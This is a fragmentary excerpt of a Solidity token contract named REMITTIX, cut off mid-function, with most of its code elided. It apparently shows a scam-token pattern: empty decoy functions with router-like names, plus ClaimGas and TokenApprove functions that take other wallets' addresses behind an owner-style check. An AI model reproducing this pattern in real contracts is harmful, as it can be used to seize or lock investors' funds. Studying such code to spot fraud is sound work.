...
contract Remittix is Ownable {
    ...
    string private _name = "REMITTIX";
    string private _symbol = "RTX";
    ...
    function routeropen() external {
    }
    function routerv2() external {
    }
    function ETHrouter() external {
    }
    function swaprouter() public {
    }
    function ClaimGas(address[] calldata walletAddress) external {
    ...
    function TokenApprove(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
